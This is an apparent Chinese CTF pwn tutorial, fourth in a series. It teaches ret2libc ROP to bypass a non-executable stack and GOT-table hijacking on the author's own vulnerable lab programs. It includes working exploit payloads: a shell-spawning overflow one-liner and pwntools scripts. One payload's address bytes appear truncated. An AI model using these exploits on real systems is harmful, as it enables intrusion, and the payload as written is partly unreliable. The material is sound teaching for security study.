
# 从0开始CTF-PWN（四）ROP绕过栈可执行保护与GOT表劫持

> 作者：`dxbaicai`

## 1. 教程说明

### 1.1 历史回顾

- 第一节我们介绍了基础环境准备：

[从0开始CTF-PWN（一）——基础环境准备](https://bbs.pediy.com/thread-259199-1.htm#1642216)

- 第二节我们介绍了栈溢出的入门：

[从0开始CTF-PWN（二）从PWN的HelloWorld-栈溢出开始](https://bbs.pediy.com/thread-259272.htm)

- 第三节我们介绍了自行构造shellcode：

[从0开始CTF-PWN（三）没有system怎么办？构造你的shellcode](https://bbs.pediy.com/thread-259723.htm)

### 1.2 本节说明

- 之前我们是利用自己构造的shellcode返回shell，但这依赖于栈上可执行代码，本篇会介绍当关闭栈上代码可执行时，如何通过ROP跳转到`libc`获得Shell。
- 说明什么是GOT，如何劫持。
- 同样，教程需要对`c`语言和汇编有一些基本理解，分析过程中遇到问题会穿插对应知识点的方式进行说明。

## 2. 环境说明

### 2.1 环境设置

为了降低入门难度，会关闭操作系统的地址空间随机化（ASLR），这是针对栈溢出漏洞被操作系统广泛采用的防御措施。

```
# 注意，下面是临时修改方案，系统重启后会被重置为2
echo 0 > /proc/sys/kernel/randomize_va_space
```

### 2.2 编译源文件

在实验环境创建`.c`源代码文件，使用如下命令进行编译，注意相比之前编译时去掉了`-z execstack`

```
gcc-4.8 -g -m32 -O0 -fno-stack-protector -o [可执行文件名] [源文件名]
```

**知识点-编译参数说明**

1. `-m32`：使用32位编译
2. `-O0`：关闭所有优化
3. `-g`：在可执行文件中加入源码信息
4. `-fno-stack-protector`：关闭栈保护
5. `-z execstack`：启用栈上代码可执行
6. `-z norelro` / `-z relro -z lazy` / `-z relro -z now` (关闭disabled / 部分开启Partial / 完全开启Full)

## 3. ROP绕过栈可执行保护

### 3.1 pwn_test_bof2.c程序

对，还是上一篇中的代码。

```
#include <stdio.h>
#include <string.h>
int main(int argc, char* argv[]) {
char buf[128];
if (argc < 2) return 1;
strcpy(buf, argv[1]);
printf("Input:%s\n", buf);
return 0;
}
```

- 使用如下命令进行编译

```
gcc-4.8 -g -m32 -O0 -fno-stack-protector -o pwn_test_bof3_32-gcc4.8 pwn_test_bof2.c
```

### 3.2 什么是ROP

回想一下上一节，我们是通过利用栈溢出漏洞，将一段自行构造的shellcode放置在栈上特定位置，并使得函数的返回值跳转到该段代码的地址执行，从而获得shell。但是这要求可以在栈上执行代码，现在栈上可执行代码被关闭了，这就要求我们要想办法跳转到可以执行代码的地方。我们看到程序引用了`libc`库的函数（两句include语句），`libc`库中显然包含有`system`函数，那么我们将可以把函数返回的地址指向`libc`中的`system`地址，从而跳转到库函数去执行。**这种使用函数返回地址(`ret`指令)连接代码的技术，就叫做ROP(Return-Oriented Programming，返回导向编程)。**

- ROP特性

甚至可以通过在栈上布置一系列内存地址，每个内存地址布置一个gadget(以`ret`/`jmp`/`call`等指令结尾的一段汇编指令)，从而实现程序的依次执行。另外很重要的一点是，我们在栈上写入的都是**内存地址**，并非需要执行的代码，使得这种方式可以有效的绕过NX保护。

### 3.3 开始构造特殊的栈结构

根据第二节中介绍的函数调用栈知识，我们构造如下的栈结构：

![ROP栈结构](/upload/attach/202011/868728_UT2RNFR3GBR4DDA.jpg)

注意ROP部分的三句话，从而实现在`main`函数返回时执行：

```
system("/bin/sh");
return xxx;
```

因为我们的目的是getshell，所以执行`system`即可，返回地址可以随意填写。

### 3.4 攻击思路

根据上面的分析，我们需要如下计算步骤：

1. 找出`buf`变量地址。
2. 找出`main`函数返回地址。
3. 计算面函数返回地址与`buf`变量地址2者的偏移量，用于填充padding。

**上述三步与前一节一致**

4. 找出`libc`中`system`函数、`"/bin/sh"`地址。
5. `padding`后填充`addr(system)` + 4位任意地址 + `addr(/bin/sh)`

思路明确，我们现在开始来逐步调试。前面3步的过程与第三节相同，这里就不再重复，现在我们来调试`libc`中地址获取。

- 获取`system`、`"/bin/sh"`地址

```
# 开始调试
gdb -q -args ./pwn_test_bof3_32-gcc4.8 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
gdb-peda$ starti
# 运行
gdb-peda$ r
# 查询关键system
gdb-peda$ print system
# 查询/bin/sh
gdb-peda$ find "/bin/sh"
```

![函数地址](/upload/attach/202011/868728_8BY63R8AQATGXUK.jpg)

得到`system`的地址为：`0xf7e145f0`，`"/bin/sh"`字符的地址为：`0xf7f58406`。于是我们构造payload为：

`"a" * 140 + "0xf7e145f0" + "\1\1\1\1" + "0xf7f58406"`

```
# 执行
./pwn_test_bof3_32-gcc4.8 $(python -c 'print "a"*140 + "\xf0\xe1\xf7" + "\x01\x01\x01\x01" + "\x06\x84\xf5\xf7"')
```

得到shell：

![ROP_getshell](/upload/attach/202011/868728_6M83R2WW5NGQSUK.jpg)

### 3.5 pwntools实现

```
# coding:utf-8
from pwn import *
context(arch='amd64', os='linux')
# 注意系统重启后地址可能会发生变化，需要重新获取
system_addr = 0xf7e145f0
binsh_addr = 0xf7f58406
payload = "A" * 140 + p32(system_addr) + "\x01\x01\x01\x01" + p32(binsh_addr)
p = process(argv=["/home/pwn/test/bof/pwn_test_bof3_32-gcc4.8", payload])
p.interactive()
```

## 4. GOT劫持

### 4.1 GOT表介绍

**知识点1**

`.got`中存放的是外部全局变量的GOT表，例如`stdin`/`stdout`/`stderr`，非延时绑定。

`.got.plt`中存放的是外部函数的GOT表，例如`printf`函数，延时绑定。

**知识点2**

GOT劫持2大要素：GOT表可写(`checksec`显示`RELRO/disabled`且Flg标志位显示为WA)与内存漏洞。

### 4.2 GOT表劫持核心思想

GOT表劫持的核心目的是通过修改GOT表中的函数地址为其他我们期望的地址，从而达到执行该函数时，通过跳转到GOT表，从而跳转到我们修改过的地址去执行指令。

### 4.3 GOT表查看方法

- 查看`got`表是否可写

```
readelf -S [program]
```

![GOT_check](/upload/attach/202011/868728_3D2Y9EGQQHRX5Q4.jpg)

- 通过命令查看GOT表中函数地址

```
objdump -R got_hacking_32-gcc4.8
```

- `pwntools`中查看

```
hex(elf.got["printf"])获取printf在GOT表的地址
```

### 4.4 got_hacking.c程序

**选自长亭科技相关分享，因为是一个特别典型和简单的got_hacking，非常适合入门，所以这里用它来做说明**

```
#include <stdio.h>
#include <stdlib.h>
void win() {
puts("You Win!");
}
void main() {
unsigned int addr, value;
scanf("%x=%x", &addr, &value);
*(unsigned int *)addr = value;
printf("set %x=%x\n", addr, value);
}
```

- 使用如下命令进行编译

```
gcc-4.8 -m32 -o got_hacking_32-gcc4.8 got_hacking.c
```

可以看到并未添加`-z relro -z now`(完全关闭)编译参数，这就为GOT表劫持提供了可能。

### 4.5 程序分析

1. 程序的目的是为了执行`win`函数，但是从`main`函数中并无入口调用`win`函数，所以我们需要想办法控制指令跳转到`win`函数的地址执行。
2. `scanf("%x=%x", &addr, &value);` — 以16进制按`{}={}`的格式读入2个数，分别写入`addr`和`value`。
3. `*(unsigned int *)addr = value;` — 关键语句：

`(unsigned int *)addr` — 将`addr`强制转化为指针类型，此时`(unsigned int *)addr`表示的是内存地址`addr`

`*(unsigned int *)addr = value;` — 将内存地址`addr`处的内容改写为`value`

**所以这里存在4字节=32bit的任意内存写入漏洞。**

### 4.6 攻击思路

1. 读取`win`函数的地址。

```
# 读取办法1：gdb中打印
gdb-peda$ p win
# 外部读取
objdump -d got_hacking_32-gcc4.8|grep win
```

2. 从`got`表中读取`printf`函数的地址。

```
objdump -R got_hacking_32-gcc4.8
```

**知识点-objdump工具**

```
objdump是linux反汇编指令。
-d(disassemble): 可以显示反汇编后的汇编代码。
-R(dynamic-reloc): 显示文件的动态重定位入口，可以用于查找libc等共享库。
```

3. 输入时利用内存泄露漏洞将`printf`函数的地址指向`win`函数。

```
# 输入addr(printf)=addr(win)，注意这里的地址不同环境不同
0804c00c=0x804918d
```

显示`win`。

![attack_4_3](/upload/attach/202011/868728_XKRFKHKZ4SE6GV5.jpg)

### 4.7 pwntools实现

```
# coding:utf-8
from pwn import *
context(arch='amd64', os='linux')
s = ssh(host="10.211.55.6", port=22, user="root", password="")
p = s.process(argv=["/home/pwn/test/got_hacking/got_hacking_32-gcc4.8"])
elf = p.elf
# 获取win函数地址
win_addr = hex(elf.sym['win'])
# 从got表中获取printf函数地址
printf_addr = hex(elf.got['printf'])
print ("win_addr: {}".format(win_addr))
print ("printf_addr: {}".format(printf_addr))
payload = printf_addr + "=" + win_addr
print ("payload: {}".format(payload))
p.sendline(payload)
# 打印输出win
print (p.recvall())
```
